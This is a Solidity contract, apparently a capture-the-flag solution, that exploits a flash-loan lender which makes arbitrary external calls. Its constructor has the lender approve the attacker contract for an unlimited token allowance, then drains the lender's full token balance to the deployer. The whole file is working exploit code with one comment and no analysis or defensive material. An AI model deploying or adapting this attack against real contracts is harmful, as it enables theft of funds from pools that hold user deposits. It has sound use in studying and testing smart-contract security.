// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ILender {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}

contract TrustedLenderExploit {
    constructor(address _lender, address _token) {
        attack(_lender, _token);
    }

    function attack(address _lender, address _token) internal {
        // Force the lender to approve attacker address as spender
        bytes memory data = abi.encodeWithSelector(
                IERC20.approve.selector,
                address(this),
                type(uint256).max
        );
        IERC20 token = IERC20(_token);
        uint256 targetBalance = token.balanceOf(_lender);
        ILender(_lender).flashLoan(0, address(this), _token, data);
        
        token.transferFrom(_lender, address(this), targetBalance);
        token.transfer(msg.sender, targetBalance);
    }
}
